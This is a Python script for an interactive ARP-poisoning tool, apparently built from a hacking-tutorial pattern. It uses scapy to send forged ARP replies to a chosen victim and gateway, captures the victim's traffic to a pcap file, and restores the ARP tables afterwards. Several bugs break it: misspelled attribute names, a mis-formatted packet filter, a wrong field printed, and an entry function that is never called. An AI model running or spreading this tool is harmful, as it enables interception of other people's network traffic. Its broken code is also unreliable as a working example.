from multiprocessing import Process
from rich.console import Console
from scapy.all import ARP, Ether, conf, send, sniff, srp, wrpcap

import sys
import time

def get_mac(targetip):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="who-has", pdst=targetip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src 
    return None

class Arper:
    def __init__(self, victim, gateway, interface='en0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0
        console.print(f"Inzitialized [bold blue]{interface}[/bold blue]: ")
        console.print(f"Gateway ({gateway}) is at [bold blue]{self.get_mac}[/bold blue]. ")
        console.print(f"Victim ({victim}) is at [bold blue]{self.victimmac}[/bold blue]. ")
        console.print("-" * 30)

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poinson_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victimmac
        print(f"ip src: {poison_victim.psrc}")
        print(f"ip dst: {poison_victim.dst}")
        print(f"mac dst: {poison_victim.hwdst}")
        print(f"mac src: {poison_victim.hwsrc}")
        print(poison_victim.summary())
        print("-" * 30)
        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gatewaymac

        print(f"ip src: {poison_gateway.psrc}")
        print(f"ip dst: {poison_gateway.dst}")
        print(f"mac dst: {poison_gateway.hwdst}")
        print(f"mac src: {poison_gateway.hwsrc}")
        print(poison_gateway.summary())
        print("-" * 30)
        console.print("Beginning the ARP poison. [bold red][CTRL-C to stop][/bold red]")
        while True:
            sys.stdout.write(".")
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self, count=100):
        time.sleep(5)
        print(f"Sniffing {count} packets")
        bpf_filter = "ip host %s % victim"
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap("arper.pcap", packets)
        print("Got the packets")
        self.restore()
        self.poison_thread.terminate()
        print("Finished")

    def restore(self):
        console.print("Restoring ARP tables...", style="bold green")
        send(ARP(
                    op=2,
                    psrc=self.gateway,
                    hwsrc=self.gatewaymac,
                    pdst=self.victim,
                    hwdst="ff:ff:ff:ff:ff:ff",
                    count=5
            ))
        send(ARP(
                    op=2,
                    psrc=self.victim,
                    hwsrc=self.victimmac,
                    pdst=self.gateway,
                    hwdst="ff:ff:ff:ff:ff:ff",
                    count=5
            ))

def initialize():
    global console
    console = Console()
    show_banner()
    console.print("\n\tAn ARP poisoning tool\n", style="bold red")
    victim = console.input("[bold blue][+][/bold blue] Type the target: ")
    gateway =  console.input("[bold blue][+][/bold blue] Type the gateway: ")
    interface = console.input("[bold blue][+][/bold blue] Type the interface: ")
    myarp = Arper(victim, gateway, interface)
    myarp.run()    

def show_banner():
    banner = """
                                            .""--..__
                     _                     []       ``-.._
                  .'` `'.                  ||__           `-._
                 /    ,-.\                 ||_ ```---..__     `-.
                /    /:::\\               /|//}          ``--._  `.
                |    |:::||              |////}                `-. 
                |    |:::||             //'///                    `.
                |    |:::||            //  ||'                      `|
                /    |:::|/        _,-//\  ||
               /`    |:::|`-,__,-'`  |/  \ ||
             /`  |   |'' ||           \   |||
           /`    \   |   ||            |  /||
         |`       |  |   |)            \ | ||
        |          \ |   /      ,.__    \| ||
        /           `         /`    `\   | ||
       |                     /        \  / ||
       |                     |        | /  ||
       /         /           |        `(   ||
      /          .           /          )  ||
     |            \          |     ________||
    /             |          /     `-------.|
   |\            /          |              ||
   \/`-._       |           /              ||
    //   `.    /`           |              ||
   //`.    `. |             \              ||
  ///\ `-._  )/             |              ||
 //// )   .(/               |              ||
 ||||   ,'` )               /              //
 ||||  /                    /             || 
 `\\` /`                    |             // 
     |`                     \            ||  
    /                        |           //  
  /`                          \         //   
/`                            |        ||    
`-.___,-.      .-.        ___,'        (/    
         `---'`   `'----'`
    """   

    console.print(banner, style="bold")          